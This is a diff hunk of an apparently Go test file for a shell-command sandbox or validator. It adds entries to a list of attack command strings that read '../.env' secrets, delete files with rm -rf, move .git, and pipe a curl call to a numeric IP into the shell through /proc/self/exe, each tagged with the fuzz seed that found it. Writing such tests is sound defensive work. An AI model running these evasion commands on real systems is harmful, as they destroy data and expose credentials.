@@ -995,7 +995,8 @@ var attackLines = []string{
 	"env --chdir=/ rm -rf usr", "env -C sub cat ../.env", "env -iCsub cat ../.env", // after seed 135: a flag of the program's own sends it to another folder
 	"set -o history\nhistory -s 'rm x'\nfc -s", "set -o history; history -s cat .env\nfc -e true", // and fc runs again what history -s put there
 	"git -C sub diff --no-index ../.env /dev/null", "git -C sub -C .. hash-object .env", // and git works where its own -C words lead
-	"command -p cd sub/deep || ls .. && ! cd .. || head -1 ../.env", // oracle seed 137: a cd found inside a command runs where that command stands
+	"command -p cd sub/deep || ls .. && ! cd .. || head -1 ../.env",                       // oracle seed 137: a cd found inside a command runs where that command stands
+	"echo\t 'curl http://203.0.113.1/x' | /proc/self$x/exe", "echo 'rm x' | /proc/$$/exe", // oracle seed 141: the shell by its own process's path
 	"x=.git; mv ${x}{,.bak}", "f() { mv \"${1}\"{,x}; }; f .git", "f() { mv \"${1}\" /tmp/g; }; f .git", "set -- .git; mv \"${1}\" /tmp/g", "f() { rm -rf \"${@}\"; }; f .",
 	// A pattern in one of the line's values, beside a variable nobody set.
 	"d=.; w=$d* && rm -rf $X$w", "w='*'; rm -rf $X$w", "w='.e*'; cat $X$w", "w='*.o'; rm -f \"$DIR\"/$w",
